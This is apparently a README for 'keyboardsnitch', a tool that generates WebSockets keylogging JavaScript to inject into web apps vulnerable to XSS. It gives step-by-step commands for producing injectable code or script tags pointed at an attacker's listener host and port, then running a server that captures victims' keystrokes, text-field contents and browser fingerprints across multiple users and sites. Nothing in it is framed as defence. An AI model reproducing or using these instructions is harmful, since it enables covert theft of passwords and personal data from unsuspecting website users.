#keyboardsnitch

An easy to use __WebSockets__ keylogger for exploiting XSS vulnerabilities. Fast, reliable, and deadly accurate.

#Key Features

- Easily generate keylogging Javascript code to inject into web apps vulnerable to XSS
- Easily generate script tags linking to keylogging Javascript code to inject into web apps vulnerable to XSS. Easily host keylogger without additional middleware such as __nginx__ or __apache__.
- Smart realtime keylogging shows you exactly where the user is typing at any given moment
- Smart realtime keylogging shows you the exact contents of every text field that the user is viewing at any given moment
- Fully grepable output
- Able to distinguish between keystrokes coming from multiple users and web apps
- Capable of fingerprinting users' browsers
- Interactive Mode included

#Setup

Dependencies can be installed by running:

	pip install -r pip.req

#Usage Instructions

##Step 1 - Inject link to WebSockets source into target page

Run __keyboardsnitch__ with the --ws-source flag to generate a link to the __WebSockets__ source code. 

	python keyboardsnitch.py --ws-source

Copy the script tag into your clipboard and inject into the vulnerable web page. Depending on the nature of the XSS vulnerability you are exploiting, you may have to modify this script tag.

##Step 2 - Inject keylogger into target page

__keyboardsnitch__ provides two methods of injecting its keylogging JavaScript code. You can choose to inject the keylogging JavaScript code directly into the target page, or you can inject a script tag that links to the JavaScript code hosted externally.

###Option 1 - Inject Raw Source Code

To generate a keylogger that can be injected directly into the target page, use the following command:

	python keyboardsnitch.py --inject-code --lhost <your ip address or fqdn here> --lport <the port on which to listen for data from the keylogger>

__keyboardsnitch__ will automatically modify the keylogger's source code to include your ip/domain and port number.

Example:
	
	python keyboardsnitch.py --inject-code --lhost 123.123.123.1 --lport 80

###Option 2 - Inject Script Tag

Should you want to inject a script tag instead of raw source code, __keyboardsnitch__ makes it easy to do that too. __keyboardsnitch__ can serve the keylogger as a JavaScript file without any additional configuration.

To generate a script tag linking to the keylogger, use the following command:

	python keyboardsnitch.py --inject-tag --lhost <your ip address or fqdn here> --lport <the port on which to listen for data from the keylogger>

As with the __WebSockets__ script tag, the generated script tag may require additional configuration or modification.

Example:

	python keyboardsnitch.py --inject-tag --lhost 123.123.123.1 --lport 80


##Step 3 - Run Server and Log Keystrokes

Once the keylogger has been injected into the target web page, we start __keyboardsnitch__'s server component to start logging keystrokes.

	python keyboardsnitch.py --lhost <your ip address or fqdn here> --lport <the port on which to listen for data from the keylogger>

When a user begins typing into a text field on the target web page, the contents of that text field will be shown in real time. Additionally, information about the text field is displayed so that you can identify what is being typed where.


###Addtional Display Options - Quick Reference

If you are targeting a page visited by multiple users, use this command:

	python keyboardsnitch.py --lhost <your ip address or fqdn here> --lport <the port on which to listen for data from the keylogger> --clients

If you are injecting the keylogger into multiple pages, use this command:

	python keyboardsnitch.py --lhost <your ip address or fqdn here> --lport <the port on which to listen for data from the keylogger> --hosts

If you are injecting the keylogger into multiple pages and expect those pages to be visited by multiple users, use this command:

	python keyboardsnitch.py --lhost <your ip address or fqdn here> --lport <the port on which to listen for data from the keylogger> --clients --hosts

If you want information about users' web browsers, use the --user-agents flag along with whatever other flags you choose to include:

	python keyboardsnitch.py --lhost <your ip address or fqdn here> --lport <the port on which to listen for data from the keylogger> --clients --hosts --user-agents

#Interactive Mode

You can also run __keyboardsnitch__ in Interactive Mode by using the --wizard flag:

	python keyboardsnitch.py --wizard

Interactive Mode will walk you through steps 1, 2, 3 shown above.
